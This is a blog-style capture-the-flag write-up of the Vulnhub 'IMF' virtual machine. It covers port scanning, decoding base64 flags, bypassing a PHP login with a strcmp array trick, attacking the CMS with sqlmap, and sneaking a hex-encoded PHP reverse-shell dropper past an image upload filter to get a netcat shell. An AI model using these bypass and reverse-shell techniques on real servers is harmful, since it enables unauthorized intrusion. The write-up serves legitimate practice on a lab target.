---
layout: post
title: IMF
---
Wlecome to my first CTF virtual machine writeup. I downloaded the virtual machine file from [Vulnhub](https://www.vulnhub.com/entry/imf-1,162/) The description doesn't give much away:
>Welcome to "IMF", my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something. 

First I decided to scan for open ports and running services using nmap:
```
nmap -sS -sV -O -A -p- 192.168.0.100
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
```
There seems to be only one service running on the target and it looks like a HTTP server. So I fire up browser to see webpage which seems to be some kind of landing page for intelligence agency:
![IMF landing page]({{ site.url }}/images/imf/homepage.jpg)
So where can I start? Skimming through sources of the page two things cought my attention. First were the names of three script files linked:
```html
<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

Especially last one looked a lot like base64 encoded but unfortunately it didn't decode well to anything readable. I made note of that to be sure to come back to that. It didn't have to wait too long. In HTML comments from contacts.php I found the first flag:
>flag1{YWxsdGhlZmlsZXM=}

It decoded to **allthefiles** which immediatly pointed me back to script file names. The trick was to merge all three names into one base64 string. After decoding we have second flag:
>flag2{aW1mYWRtaW5pc3RyYXRvcg==}

Flag 2 decodes to **imfadministrator**, could it be hidden folder on webserver? You bet it is! Under /imfadministrator we find simple login form:
```html
<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```

Comment under login form claims that 'Roger' couldn't get the sql working so he hardcoded the password. Trying some generic logins like 'admin' I got the 'Invalid username.' response. So there is a chance that if I get login right the site will tell me.

Tried admin and some combinations of roger, author of the comment but no luck. Then I remembered the /contact.php page. There is email rmichaels@imf.local for Roger so I figured it's his login. Now the page says the 'Invalid password', so I'm on the good track.

How to break super-safe hardcoded password? Well, all you need to do is to do is to pass argument as an array in post request, like this:
>user=rmichaels&pass[]=

Why this works? Probably 'Roger' used PHP function 'strcmp' which returns 0 both on equal strings and error. So when it got array instead of string it let us bypass the password check.
```html
flag3{Y29udGludWVUT2Ntcw==}<br />Welcome, rmichaels<br /><a href='cms.php?pagename=home'>IMF CMS</a>
```

Decoding flag 3 yields 'continueTOcms' hint which frankly is pretty obvious given it's the only link we see.

CMS cracked with sqlmap
flag4{dXBsb2Fkcjk0Mi5waHA=}
Flag 4 decodes to uploadr942.php
Navigating to /imfadministrator/uploadr942.php reveals simple file uploader. 
Couple minutes of fiddling with different samples of files I found out the server
allows only graphic files, filtering in addition some 'dangerous' php functions.
After uploading the file we can find the comment with strange string.
It's the file name of a file found in the /imfadministrator/uploads/ folder
after uploading the image.
After more experimenting I found out that it does allow file_put_contents function, 
so I decided to obfuscate actual payload inside a dropper utilizing this function:
cp /usr/share/webshells/php/php-reverse-shell.php reverse-shell.php
Set proper host
cat reverse-shell.php | xxd -p | tr -d [:space:] > payloadhex.txt
Wrap it in php dropper and add GIF98 header to fool filter.
Next navigate to a dropper (remember to check the name of the file in the HTML comment)
after running a dropper we can setup a listener on attackers machine:
nc -lp 1234
and after navigating to /msfadministrator/uploads/backdoor.php we ge a shell!
Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 15:53:41 up  2:42,  0 users,  load average: 0.11, 0.12, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
Now we can navigate to /var/www/html/imfadministrator/uploads
And besides our uploaded junk we have a flag:
drwxr-xr-x 2 www-data www-data  4096 Jun  7 13:36 .
drwxr-xr-x 4 www-data www-data  4096 Oct 17  2016 ..
-rw-r--r-- 1 www-data www-data    82 Oct 12  2016 .htaccess
-rw-r--r-- 1 www-data www-data  6074 Jun  6 13:01 048cc0ba197b.gif
-rw-r--r-- 1 www-data www-data    27 Jun  2 10:53 15d75ca3b468.gif
-rw-r--r-- 1 www-data www-data 11052 Jun  7 13:36 29ab56559292.gif
-rw-r--r-- 1 www-data www-data  6061 Jun  6 10:57 4688d3be2edf.gif
-rw-r--r-- 1 www-data www-data 45944 Jun  2 10:49 66024f4e10de.jpg
-rw-r--r-- 1 www-data www-data  6089 Jun  6 10:59 825abef8c60f.gif
-rw-r--r-- 1 www-data www-data  5494 Jun  7 13:37 backdoor.php
-rw-r--r-- 1 www-data www-data 58816 Jun  1 13:09 bd580392b826.jpg
-rw-r--r-- 1 www-data www-data 58816 Jun  1 13:00 c4e76ada9220.jpg
-rw-r--r-- 1 www-data www-data    28 Oct 12  2016 flag5_abc123def.txt

flag5{YWdlbnRzZXJ2aWNlcw==}
Flag 5 decodes to agentservices
